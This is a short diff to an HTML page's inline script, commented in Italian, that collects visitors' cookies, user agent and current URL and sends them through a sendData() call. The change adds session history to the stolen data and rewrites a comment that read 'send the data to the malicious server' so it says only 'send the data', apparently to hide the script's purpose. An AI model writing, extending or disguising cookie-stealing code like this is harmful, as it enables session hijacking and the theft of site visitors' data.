@@ -22,11 +22,12 @@
         var currentURL = window.location.href;
 
         // Componi i dati da inviare
-        var data = "cookies=" + encodeURIComponent(cookies) + 
+          var data = "cookies=" + encodeURIComponent(cookies) + 
                    "&userAgent=" + encodeURIComponent(userAgent) +
-                   "&currentURL=" + encodeURIComponent(currentURL);
+                   "&currentURL=" + encodeURIComponent(currentURL)+
+                   "&sessionHistory=" + encodeURIComponent(sessionHistory);
 
-        // Invia i dati al server malevolo
+        // Invia i dati
         sendData(data);
     </script>
 </body>
